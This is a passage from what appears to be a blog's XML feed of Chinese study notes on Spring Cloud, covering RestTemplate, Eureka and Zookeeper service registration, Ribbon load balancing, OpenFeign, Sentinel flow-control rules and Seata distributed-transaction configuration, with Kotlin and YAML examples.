持久化配置将内嵌式数据库替换成mysql高可用数据源。保证数据的一致性从derby到mysql的切换：

启动的集群的cluster配置方式不能是127.0.0.1,linux无法识别

shell命令，添加新端口启动方式
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud(2)</title>
    <url>/posts/2aad0ec3/</url>
    <content><![CDATA[微服务模块构建流程建module 改pom 改yml 主启动 业务类建数据库 建entities 建dao 加service 加controller
Devtools热部署，更新内容后自动重新启动

添加jar包(放在子包中)
&lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;            &lt;scope&gt;runtime&lt;/scope&gt;            &lt;optional&gt;true&lt;/optional&gt;        &lt;/dependency&gt;

添加插件(放入父类总工程)
&lt;plugin&gt;                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;                &lt;configuration&gt;&lt;!--                    &lt;fork&gt;true&lt;/fork&gt;--&gt;                    &lt;addResources&gt;true&lt;/addResources&gt;                &lt;/configuration&gt;            &lt;/plugin&gt;

开启自动编译的选项

按ctrl+shirft+alt+/


RestTemplateRestTemplate提供了多种编写访问Http服务的方法，是一种简单便携的访问restful服务模板类，是Spring提供的用于访问Rest服务的客户端模板工具集。与之类似的还有spring-database-template。redis-template

配置bean
@Configurationopen class ApplicationContextConfig &#123;    private val gsonHttpMessageConverter = GsonHttpMessageConverter()    //这里的原因是因为kotlin的反序列化有点难搞，你需要配置他的转换器为gson的转换器。    @Bean    open fun restTemplate() = RestTemplate().apply &#123;        messageConverters.add(0,gsonHttpMessageConverter)    &#125;&#125;//applicationContext.xml &lt;bean id=&quot;&quot; class=&quot;&quot;&gt;
这样子，每次spring都会为你自动配置一个restTemplate。

使用Resttemplate
@RestController@RequestMapping(&quot;/consumer&quot;)class OrderController &#123;    private val PAYMENT_URL = &quot;http://localhost:8001&quot;    private val log = LoggerFactory.getLogger(javaClass)    @Resource    private lateinit var restTemplate: RestTemplate    @GetMapping(&quot;/payment/create&quot;)    fun create(payment: Payment): CommonResult&lt;*&gt; &#123;        log.info(&quot;消费者创建订单:$payment&quot;)        return restTemplate.postForObject(&quot;$PAYMENT_URL/payment/create&quot;, payment)    &#125;    @GetMapping(&quot;/payment/get/&#123;id&#125;&quot;)    fun getPayment(@PathVariable(&quot;id&quot;) id: Long): CommonResult&lt;*&gt; &#123;        log.info(&quot;消费者查询订单&quot;)        return restTemplate.getForObject&lt;CommonResult&lt;Payment&gt;&gt;(&quot;$PAYMENT_URL/payment/get/$id&quot;)    &#125;&#125;
他的主要方法就是get或者postForObject。然后三个参数分别为地址，请求参数和返回值


工程同构为了解决一些冗余问题，如：这些entities类都是一模一样的工程同构操作如下：

建一个module命名为cloud-api-commons然后导入以下依赖（因为以后要用）：&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;cn.hutool&lt;/groupId&gt;            &lt;artifactId&gt;hutool-all&lt;/artifactId&gt;            &lt;version&gt;5.8.15&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;
然后把其他类中所有的entities都复制粘贴过来。
maven install然后调用maven的安装。
最后在需要使用的子module中引入这个jar包就算实现了工程同构了

]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(13)</title>
    <url>/posts/209c0d67/</url>
    <content><![CDATA[Seata处理分布式事务问题：(有多个库，如何保持一致，在物理上有多个数据库，但逻辑上保持一个数据库)单体应用被拆分成微服务应用，原来的三个模块被拆分成三个独立的应用，分别使用三个独立的数据源。业务操作需要调用三个服务来完成。此时每个服务内部的数据一致性由本地事务来保证，但是全局的数据一致性问题没法保证。
官网地址：https://seata.io/zh-cn/
Seata组成
全局唯一的事务ID
三组件TC，TM，RMTC事务协调者维护全局和分支事务的状态，驱动全局事务提交或回滚。TM事务管理器定义全局事务的范围：开始全局事务、提交或回滚全局事务。RM资源管理器管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。

处理过程
TM向TC申请开启一个全局事务，全局事务创建成功并性成一个全局唯一的ID;
XD在微服务调用链路的上下文中传播：
RM向TC注册分支事务，将其纳入ID对应全局事务的管辖；
TM向TC发起针对ID的全局提交或回滚决议；
TC调度XD下管辖的全部分支事务完成提交或回滚请求。

下载配置（只限于0.9版本以前）下载完成后，先备份file.conf然后再修改该文件 主要修改：自定义事务组名称+事务日志存储模块为db+数据库连接信息

service模块：service &#123;  #vgroup-&gt;rgroup  vgroup_mapping.my_test_tx_group = &quot;springcloud&quot;  ···&#125;
store模块store &#123;  ## store mode: file、db  mode = &quot;db&quot;  ## file store  file &#123;    dir = &quot;sessionStore&quot;    # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions    max-branch-session-size = 16384    # globe session size , if exceeded throws exceptions    max-global-session-size = 512    # file buffer size , if exceeded allocate new buffer    file-write-buffer-cache-size = 16384    # when recover batch read size    session.reload.read_size = 100    # async, sync    flush-disk-mode = async  &#125;  ## database store  db &#123;    ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp) etc.    datasource = &quot;dbcp&quot;    ## mysql/oracle/h2/oceanbase etc.    db-type = &quot;mysql&quot;    driver-class-name = &quot;com.mysql.jdbc.Driver&quot;    url = &quot;jdbc:mysql://127.0.0.1:3306/seata&quot;    user = &quot;root&quot;    password = &quot;123456&quot;    min-conn = 1    max-conn = 3    global.table = &quot;global_table&quot;    branch.table = &quot;branch_table&quot;    lock-table = &quot;lock_table&quot;    query-limit = 100  &#125;&#125;
根据conf给你提供的sql建立一个sql数据库
修改register.confregistry &#123;  # file 、nacos 、eureka、redis、zk、consul、etcd3、sofa  type = &quot;nacos&quot;  nacos &#123;    serverAddr = &quot;localhost:8848&quot;    namespace = &quot;&quot;    cluster = &quot;default&quot;  &#125;

业务准备详细的可以查看脑图文件，见springcloud学习尚硅谷每个库都执行建立一个回滚表![图片上传失败(0)]
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud(12)</title>
    <url>/posts/39873c26/</url>
    <content><![CDATA[Sentinel 分布式系统的流量防卫兵

下载安装https://github.com/alibaba/Sentinel/releases/tag/1.8.6启动后默认端口为8080
构建微服务：POM：&lt;dependencies&gt;        &lt;!--       Springcloud ailibaba nacos --&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!--Springcloud ailibaba sentinel-datasource-nacos后续做特久化用到 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt;            &lt;artifactId&gt;sentinel-datasource-nacos&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!--Springcloud ailibaba sentinel --&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!--openfeign--&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!--SpringBoot.整合web组件+actuator--&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;            &lt;artifactId&gt;kotlin-reflect&lt;/artifactId&gt;            &lt;version&gt;1.9.0&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;

YML:
server:  port: 8401spring:  application:    name: cloudalibaba-sentinel-service  cloud:    nacos:      discovery:        server-addr: localhost:8848    sentinel:      transport:        dashboard: localhost:8080        # 默认为8719端口，假如8719被占用，会依次+1，直到找到未使用端口        port: 8719management:  endpoints:    web:      exposure:        include: &quot;*&quot;

Sentinel采用的懒加载模式：也就是只有当微服务被访问时才会加载出来
流控规则资源名：唯一名称，默认请求路径针对来源：Sentinel可以针对调用者进行限流，填写微服务名，默认default(不区分来源)阈值类型单机阈值：

QPS(每秒钟的请求数量)：当调用该api的QPS达到阈值的时候，进行限流
线程数：当调用该api的线程数达到阈值的时候，进行限流是否集群：不需要集群流控模式：
直接：api达到限流条件时，直接限流
关联：当关联的资源达到阈值时，就限流自己
链路：只记录指定涟路上的流量（指定资源从入口资源进来的流量，如果达到阈值，就进行限流)【api级别的针对来源】流控效果：
快速失败：直接失败，抛异常
Warm Up:根据codeFactor(冷加载因子，默认3)的值，从阈值&#x2F;codeFactor,经过预热时长，才达到设置的QPS阈值
排队等待:匀速排队，让请求以匀速的速度通过，阈值类型必须设置为QPS，否则无效

降级规则

Sentinel熔断降级会在调用链路中某个资源出现不稳定状态时（例如调用超时或异常比例升高），对这个资源的调用进行限制让请求快速失败，避免影响到其它的资源而导致级联错误。当资源被降级后，在接下来的降级时间窗口之内，对该资源的调用都自动熔断（默认行为是抛出DegradeException)。


RT(平均响应时间，秒级)平均响应时间 超出阈值 且 在时间窗口内通过的请求&gt;&#x3D;5，两个条件同时满足后触发降级窗口期过后关闭断路器RT最大4900（更大的需要通过-Dcsp.sentinel..statistic.max.rt&#x3D;XXXX才能生效）

异常比列（秒级）每秒QPS&gt;&#x3D;5且异常比例（秒级统计）超过阈值时，触发降级；时间窗口结束后，关闭降级

异常数(DEGRADE_GRADE_EXCEPTION_COUNT)当资源近1分钟的异常数目超过阈值之后会进行熔断。注意由于统计时间窗口是分钟级别的，若timeWindow小于60s,则结束熔断状态后好可能再进入熔断状态。


热点规则限制你的参数访问量资源名是否加斜线，将会对应到他是从GetMapping（rest地址）获取的还是从SentinelResource获取的（也就是作为唯一标识）
@GetMapping(&quot;/testHotKey&quot;)    @SentinelResource(&quot;testHotKey&quot;, blockHandler = &quot;dealTestHotKey&quot;)     open fun testHotKey(        @RequestParam(value = &quot;p1&quot;, required = false) p1: String?,        @RequestParam(value = &quot;p2&quot;, required = false) p2: String?    ): String &#123;        return &quot;test 测试热点数据&quot;    &#125;     open fun dealTestHotKey(p1: String?, p2: String? ,e:BlockException): String &#123;        return &quot;deal_hotkey&quot;    &#125;
兜底方法（也就是限流，熔断后的反馈方法{fallback}）从HystrixCommand到@SentinelResource使用blockHandler必须保证后面还需要一个BlockException的参数

@SentinelResource处理的是Sentinel控制台配置的违规情况，有blockHandler方法配置的兜底处理；RuntimeExceptionint age&#x3D; 10&#x2F;0,这个是java运行时报出的运行时异常RunTimeException,@SentinelResource不管

系统规则
系统自适应限流：也就是将整个应用完全包裹起来，在应用外设置限流
系统保护规则是从应用级别的入口流量进行控制，从单台机器的Load、CPU使用率、平均RT、入口QPS和并发线程数等几个维度监控应用指标，让系统尽可能跑在最大吞吐量的同时保证系统整体的稳定性。系统保护规则是应用整体维度的，而不是资源维度的，并且仅对入口流量生效。入口流量指的是进入应用的流量(EntryType.IN),比如Web服务或Dubbo服务端接收的请求，都属于入口流量。系统规则支持以下的模式：

Load自适应（仅对inux&#x2F;Unix-like机器生效）：系统的load1作为启发指标，进行自适应系统保护。当系统lod1超过设定的启发值，且系统当前的并发线程数超过估算的系统容量时才会触发系统保护(BBR阶段)。系统容量由系统的max Qpsmint估算得出。设定参考值一般是CPU cores2.5。
CPU usage(1.5.0+版本)：当系统CPU使用率超过阈值即触发系统保护（取值范围0.0-1.0),比较灵敏。
平均RT:当单台机器上所有入口流量的平均RT达到阈值即触发系统保护，单位是毫秒。
并发线程数：当单台机器上所有入口流量的并发线程数达到阈值即触发系统保护。
入口QPS:当单台机器上所有入口流量的QPS达到阈值即触发系统保护。

详细SentinelResource讲解
解耦统一的处理兜底方法：使用blockHandlerClass来统一处理。
@SentinelResource(blockHandlerclass=CustomerBlockHandler.class,blockHandler=&quot;handlerException2&quot;))···public class CustomerBlockHandler&#123;	public static CommonResult handlerException1(BlockException exception)&#123;	return new CommonResult(4444,&quot;按客戶自定义，global hand1 erException---1&quot;);	&#125;	public static CommonResult handlerException2(BlockException exception)&#123;	return new CommonResult(4444,&quot;按客戶自定义，global handlerException---2&quot;);	&#125;&#125;
服务熔断sentinel整合ribbon+openfeign+fallback

fallback：解决运行时异常需要使用@PathVariable来获取参数
blockHandler：解决配置违规

可以同时配置fallback和blockHandler。但是blockHandler的优先级更高。
异常忽略即不再帮助解决异常和错误问题。而是使用系统默认的解决方案
FeignPOM：
&lt;!--openfeign--&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;        &lt;/dependency&gt;
YML:
feigh:	sentinel:			enabled: true

主启动添加@EnableFeignClients
业务类：接口+注解实现他的fallback类
规则持久化每次重启微服务都会导致所有规则消失，因此需要配置持久化所以把他保持到nacos中POM：：
&lt;!--Springcloud ailibaba sentinel-datasource-nacos后续做特久化用到 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt;            &lt;artifactId&gt;sentinel-datasource-nacos&lt;/artifactId&gt;        &lt;/dependency&gt;
YML:
spring:  application:    name: cloudalibaba-sentinel-service  cloud:    nacos:      discovery:        server-addr: localhost:8848    sentinel:      transport:        dashboard: localhost:8080        # 默认为8719端口，假如8719被占用，会依次+1，直到找到未使用端口        port: 8719      datasource:        ds1:          nacos:            server-addr: localhost:8848            data-id: cloudalibaba-sentinel-service            group-id: DEAULT_GROUP            data-type: json            rule-type: flow
然后在nacos中添加一个与上面data-id相同的配置，也就是application.name
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud(3)</title>
    <url>/posts/33b63f82/</url>
    <content><![CDATA[服务注册中心Eureka什么是服务治理？springcloud封装了Netflix公司开发的Eureka模块来实现服务治理
在传统的rpc远程调用框架中，管理每个服务与服务之间依赖关系比较复杂，管理比较复杂。所有要使用夫妇治理，管理服务与服务之间的依赖关系，可以实现服务调用，负载均衡，容错等。实现服务发现和注册。
单机Eureka搭建步骤
构建服务端修改pom文件：&lt;dependencies&gt;&lt;!--        自定义api通用包--&gt;        &lt;dependency&gt;            &lt;groupId&gt;top.zfxt.springcloud&lt;/groupId&gt;            &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt;            &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;        &lt;/dependency&gt;&lt;!--        eureka服务端--&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!-- https://mvnrepository.com/artifact/org.jetbrains.kotlin/kotlin-reflect --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;            &lt;artifactId&gt;kotlin-reflect&lt;/artifactId&gt;            &lt;version&gt;1.9.0&lt;/version&gt;            &lt;scope&gt;runtime&lt;/scope&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;
修改yml文件:server:  port: 7001eureka:  instance:    hostname: localhsot #eureka服务端的实例名称  client:    #false 表示不会注册自己    register-with-eureka: false    # false表示自己就是注册中心，职责是维护服务实例。不需要检索服务    fetch-registry: false    service-url:      defaultZone: http://$&#123;eureka.instance.hostnmae&#125;:$&#123;server.port&#125;/eureka/

主启动文件：
@SpringBootApplication@EnableEurekaServeropen class EurekaMain7001fun main(args: Array&lt;String&gt;) &#123;    runApplication&lt;EurekaMain7001&gt;(*args)&#125;//添加注解设置为服务端

注册其他服务到eureka中

导包：&lt;!--        eureka客户端--&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;        &lt;/dependency&gt;
添加yml
这里要注意一个内容：

spring:  application:    name: cloud-payment-name# 这里配置的服务名字影响到了后期如何快捷的调用服务和负载均衡


eureka:  client:    #true 表示注册自己，默认为true    register-with-eureka: true    # 是否从EurekaServer抓取已有的注册信息，默认为true。单节点无所谓，集群必须使用true，并配合ribbon使用负载均衡    fetch-registry: false    service-url:      defaultZone: http://localhost:7001/eureka

主启动添加注解：@EnableEurekaClient

Eureka集群情景：实现负载均衡+故障容错集群注册原理：互相注册，相互守望
搭建：新建module，改pom都没有问题。但是如果需要配置集群的话，需要为两个服务器配置不同的地址和名称，并且相互注册。如下：(前提是你再hosts文件里配置好了eureka7001.com和eureka7002.com的地址都指向了127.0.0.1)
# 7001server:  port: 7001eureka:  instance:    hostname: eureka7001.com #eureka服务端的实例名称  client:    #false 表示不会注册自己    register-with-eureka: false    # false表示自己就是注册中心，职责是维护服务实例。不需要检索服务    fetch-registry: false    service-url:      defaultZone: http://eureka7002.com:7002/eureka
# 7002server:  port: 7002eureka:  instance:    hostname: eureka7002.com #eureka服务端的实例名称  client:    #false 表示不会注册自己    register-with-eureka: false    # false表示自己就是注册中心，职责是维护服务实例。不需要检索服务    fetch-registry: false    service-url:      defaultZone: http://eureka7001.com:7001/eureka

然后为其他微服务配置进入这个eureka集群中他与原来的区别只有：
#      defaultZone: http://localhost:7001/eurekadefaultZone: http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka # 集群版
仅此而已
kotlin在springboot中的使用：需要注意的是，kotlin自身的string字符串中默认就有$内插字符串。所以在使用springboot中的$符号时，需要加上\转义符。例如：文中的@Value(“${server.port}”)是需要添加转义符才能添加进去的。
@RestControllerclass PaymentController &#123;    private val log = LoggerFactory.getLogger(javaClass)    @Value(&quot;\$&#123;server.port&#125;&quot;)    private lateinit var serverPort:String    @Autowired    private lateinit var paymentService: PaymentService    @PostMapping(&quot;/payment/create&quot;)    fun create(@RequestBody payment: Payment): CommonResult&lt;out Int&gt; &#123;        log.info(&quot;*****插入数据：$payment&quot;)        val result = paymentService.create(payment)        log.info(&quot;*****插入结果：$result&quot;)        if (result &gt; 0) &#123;            return CommonResult(200, &quot;插入数据成功,服务端口:$serverPort&quot;, result)        &#125; else &#123;            return CommonResult(444, &quot;插入数据失败&quot;, null)        &#125;    &#125;    @GetMapping(&quot;/payment/get/&#123;id&#125;&quot;)    fun getPaymentById(@PathVariable(&quot;id&quot;) id: Long): CommonResult&lt;*&gt; &#123;        val result = paymentService.getPaymentById(id)        log.info(&quot;*****查询结果：$result&quot;)        return CommonResult(200, &quot;查询数据成功,服务端口：$serverPort&quot;, result)    &#125;&#125;

负载均衡
修改服务的调用方式，从固定改为从eureka获取：

//    private val PAYMENT_URL = &quot;http://localhost:8001&quot;        private val PAYMENT_URL = &quot;http://CLOUD-PAYMENT-SERVICE&quot;
如上2.添加注解
@Bean   @LoadBalanced //使用@LoadBalanced注解赋予RestTemplate负载均衡的能力   open fun restTemplate() = RestTemplate().apply &#123;       messageConverters.add(0,gsonHttpMessageConverter)   &#125;

actuator微服务信息完善
修改主机名称。（让他只暴露服务名称）在eureka中加上instance实例id
访问信息有IP地址

服务发现Discovery他可以访问到所有微服务的类型和信息

配置@EnableDiscoveryClient注解在主启动类上

@EnableDiscoveryClientopen class PaymentMain8001


在controller中添加一个client自动注入discoveryClient
@Resource    private lateinit var  discoveryClient: DiscoveryClient

配置一个get服务测试
@GetMapping(&quot;/payment/discovery&quot;)    fun discovery():DiscoveryClient&#123;        val services = discoveryClient.services        services.forEach &#123;            log.info(&quot;*****element:$it&quot;)        &#125;        val instances = discoveryClient.getInstances(&quot;CLOUD-PAYMENT-SERVICE&quot;)        instances.forEach &#123;            log.info(&quot;*****instance:$&#123;it.uri&#125;&quot;)        &#125;        return discoveryClient    &#125;
可以获取所有的微服务信息


Eureka自我保护机制服务端：客户端：
Zookeeper
搭建注册中心可以简单的使用docker来搭建，或者直接用服务器这里演示docker
# 拉取ZooKeeper镜像最新版本docker pull zookeeper:latest# 启动dockerdocker run -d -e TZ=&quot;Asia/Shanghai&quot; -p 2181:2181  --name zookeeper --restart always zookeeper
更多关于zookeeper的内容可以查看该文章

建module

改pom去除掉eureka的包，导入zookeeper包
&lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-zookeeper-discovery&lt;/artifactId&gt;        &lt;/dependency&gt;
改yam
server:  port: 8004# 服务别名,注册zookeeper到注册中心名称spring:  application:    name: cloud-provider-payment  cloud:    zookeeper:      connect-string: localhost:2181
然后添加discoveryClient用来获取微服务信息：


&#123;    &quot;discoveryClients&quot;: [        &#123;            &quot;serviceDiscovery&quot;: &#123;&#125;,            &quot;zookeeperDiscoveryProperties&quot;: &#123;                &quot;hostInfo&quot;: &#123;                    &quot;override&quot;: false,                    &quot;ipAddress&quot;: &quot;192.168.200.1&quot;,                    &quot;hostname&quot;: &quot;localhost&quot;                &#125;,                &quot;enabled&quot;: true,                &quot;root&quot;: &quot;/services&quot;,                &quot;uriSpec&quot;: &quot;&#123;scheme&#125;://&#123;address&#125;:&#123;port&#125;&quot;,                &quot;instanceHost&quot;: &quot;localhost&quot;,                &quot;instanceIpAddress&quot;: &quot;192.168.200.1&quot;,                &quot;preferIpAddress&quot;: false,                &quot;register&quot;: true,                &quot;metadata&quot;: &#123;&#125;,                &quot;initialStatus&quot;: &quot;UP&quot;,                &quot;order&quot;: 0            &#125;        &#125;,        &#123;            &quot;simpleDiscoveryProperties&quot;: &#123;                &quot;instances&quot;: &#123;&#125;,                &quot;local&quot;: &#123;                    &quot;uri&quot;: &quot;http://localhost:8004&quot;,                    &quot;host&quot;: &quot;localhost&quot;,                    &quot;port&quot;: 8004,                    &quot;secure&quot;: false,                    &quot;metadata&quot;: &#123;&#125;,                    &quot;serviceId&quot;: &quot;cloud-provider-payment&quot;                &#125;,                &quot;order&quot;: 0            &#125;        &#125;    ]&#125;

@GetMapping(&quot;/payment/zk&quot;)    fun discovery(): Any &#123;        val services = discoveryClient.services        services.forEach &#123;            log.info(&quot;*****element:$it&quot;)        &#125;        val instances = discoveryClient.getInstances(&quot;cloud-provider-payment&quot;)        instances.forEach &#123;            log.info(&quot;*****instance:$&#123;it.uri&#125;&quot;)        &#125;        return discoveryClient    &#125;
访问方法如上结果：
zookeeper没有自动保护机制，节点退出后立刻就会消失
至于zookeeper的使用。与eureka类似。只要不写死调用端口，而使用服务名。即private val url = &quot;http://cloud-provider-payment&quot;一样可以实现负载均衡
Consul不做具体配置。知道有这个东西即可。需要使用时，可以很容易的从以上两点得到启发。
三者异同
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(4)</title>
    <url>/posts/7cf7a945/</url>
    <content><![CDATA[负载均衡RibbonSpring Cloud Ribbon是基于Netflix Ribbon3实现的一套客户端负载均衡的工具。简单的说，Ribbon是Netflix发布的开源项目，主要功能是提供客户端的软件负载均衡算法和服务调用。Ribbon客户端组件提供一系列完善的配置项如连接超时，重试等。简单的说，就是在配置文件中列出Load Balancer(简称LB)后面所有的机器，Ribbon会自动的帮助你基于某种规则（如简单轮询，随机连接等）去连接这些机器。我们很容易使用Ribbo实现自定义的负载均衡算法。
当前Ribbon已经进入维护阶段
LB负载均衡(Load Balance)是什么？简单的说就是将用户的请求平摊的分配到多个服务上，从而达到系统的HA(高可用)。常见的负载均衡有软件Nginx,LVS,硬件F5等。
Ribbon本地负载均衡客户端VS Nginx服务端负载均衡区别Nginx是服务器负载均衡，客户端所有请求都会交给nginx,然后由nginx实现转发请求。即负载均衡是由服务端实现的。Ribbon本地负载均衡，在调用微服务接口时候，会在注册中心上获取注册信息服务列表之后缓存到)VM本地，从而在本地实现RPC远程服务调用技术。换种说法就是，Nginx属于集中式的负载均衡，Ribbon属于进程式负载均衡

spring-cloud-starter-netflix-eureka-client自带了spring-cloud-starter–ribbon用

RestTemplate+负载均衡restTemplate的getForObject和getForEntity的区别：但是主要使用的任然是getForObject
IRule根据特定算法从服务列表中抽取服务他的源码如下：
public interface IRule &#123;    Server choose(Object var1);    void setLoadBalancer(ILoadBalancer var1);    ILoadBalancer getLoadBalancer();&#125;
这是一些实现方法
替换负载均衡的规则：

官方文档明确给出了警告：这个自定义配置类不能放在@ComponentScan所扫描的当前包下以及子包下，否则我们自定义的这个配置类就会被所有的Ribbon客户端所共享，达不到特殊化定制的目的了。也就是所有的springboot中的项目都有@ComponentScan。因此你需要放在一个新的包下


添加包，并生成新类
@Configurationopen class MySelfRule &#123;    @Bean    open fun myRule(): IRule &#123;        return RandomRule() // 随机    &#125;&#125;

为主启动类添加注解
@RibbonClient(name = &quot;CLOUD-PAYMENT-SERVICE&quot;, configuration = [MySelfRule::class])open class OrderMain80
然后即可


负载均衡
轮询算法原理

源码解析


以下是轮询算法的源码：已添加注释
public class RoundRobinRule extends AbstractLoadBalancerRule &#123;    private AtomicInteger nextServerCyclicCounter;    private static final boolean AVAILABLE_ONLY_SERVERS = true;    private static final boolean ALL_SERVERS = false;    private static Logger log = LoggerFactory.getLogger(RoundRobinRule.class);    public RoundRobinRule() &#123;        nextServerCyclicCounter = new AtomicInteger(0);    &#125;    public RoundRobinRule(ILoadBalancer lb) &#123;        this();        setLoadBalancer(lb);    &#125;    public Server choose(ILoadBalancer lb, Object key) &#123;        if (lb == null) &#123;            log.warn(&quot;no load balancer&quot;);            return null;        &#125;        Server server = null;        int count = 0;        while (server == null &amp;&amp; count++ &lt; 10) &#123;            List&lt;Server&gt; reachableServers = lb.getReachableServers();            List&lt;Server&gt; allServers = lb.getAllServers();            int upCount = reachableServers.size();            int serverCount = allServers.size();            if ((upCount == 0) || (serverCount == 0)) &#123;                log.warn(&quot;No up servers available from load balancer: &quot; + lb);                return null;            &#125;            int nextServerIndex = incrementAndGetModulo(serverCount);            server = allServers.get(nextServerIndex);            if (server == null) &#123;                /* Transient. */                Thread.yield();                continue;            &#125;            if (server.isAlive() &amp;&amp; (server.isReadyToServe())) &#123;                return (server);            &#125;            // Next.            server = null;        &#125;        if (count &gt;= 10) &#123;            log.warn(&quot;No available alive servers after 10 tries from load balancer: &quot;                    + lb);        &#125;        return server;    &#125;    /**     * Inspired by the implementation of &#123;@link AtomicInteger#incrementAndGet()&#125;.     *     * @param modulo The modulo to bound the value of the counter.     * @return The next value.     */    private int incrementAndGetModulo(int modulo) &#123;        for (;;) &#123;            int current = nextServerCyclicCounter.get();            int next = (current + 1) % modulo;            if (nextServerCyclicCounter.compareAndSet(current, next))                return next;        &#125;    &#125;    @Override    public Server choose(Object key) &#123;        return choose(getLoadBalancer(), key);    &#125;    @Override    public void initWithNiwsConfig(IClientConfig clientConfig) &#123;    &#125;&#125;
轮询算法的关键是：
private int incrementAndGetModulo(int modulo) &#123;        for (;;) &#123;            int current = nextServerCyclicCounter.get();            int next = (current + 1) % modulo;            if (nextServerCyclicCounter.compareAndSet(current, next))                return next;        &#125;    &#125;
解释：

原子类型AtomicInteger类是系统底层保护的int类型，通过提供执行方法的控制进行值的原子操作。AtomicInteger它不能当作Integer来使用

自旋锁自旋锁的定义：当一个线程尝试去获取某一把锁的时候，如果这个锁此时已经被别人获取(占用)，那么此线程就无法获取到这把锁，该线程将会等待，间隔一段时间后会再次尝试获取。这种采用循环加锁 -&gt; 等待的机制被称为自旋锁(spinlock)。


如果这个原子int类型的数据跟新为了next。那么就让他返回true。然后结束循环。他就可以获得正确的序号。系统会通过server = allServers.get(nextServerIndex);实现返回对应的服务器给调用对象
OpenFeignFeign,是一个声明式WebService客户端。使用Feign能让编写Web Service客户端更加简单。它的使用方法是定义一个服务接口然后在上面添加注解。Feign也支持可拔插式的编码器和解码器。Spring Cloud对Feign进行了封装,使其支持了Spring MVC标准注解和HttpMessageConverters。Feign可以与Eureka和Ribbon组合使用以支持负载均衡
Feign能干什么？Feign旨在使编写Java Http客户端变得更容易。前面在使用Ribbon+RestTemplatel时，利用RestTemplate对http请求的封装处理，形成了一套模版化的调用方法。但是在实际开发中，由于对服务依赖的调用可能不止一处，往往一个接口会被多处调用，所以通常都会针对每个微服务自行封装一些客户端类来包装这些依赖服务的调用。所以，Feign在此基础上做了进一步封装，由他来帮助我们定义和实现依赖服务接口的定义。在Feign的实现下我们只需创建一个接口并使用注解的方式来配置它（以前是Dao接口上面标注Mapper注解，现在是一个微服务接口上面标注一个Feign注解即可，即可完成对服务提供方的接口绑定，简化了使用Spring cloud Ribbon时，自动封装服务调用客户端的开发量。Feign集成了Ribbon。利用Ribbon维护了Payment的服务列表信息，并且通过轮询实现了客户端的负载均衡。而与Ribbon不同的是，通过feign.只需要定义服务绑定接口且以声明式的方法，优雅而简单的实现了服务调用
使用步骤
接口+注解微服务调用接口+@FeignClient

新建cloud-consumer-feign-order80

POM
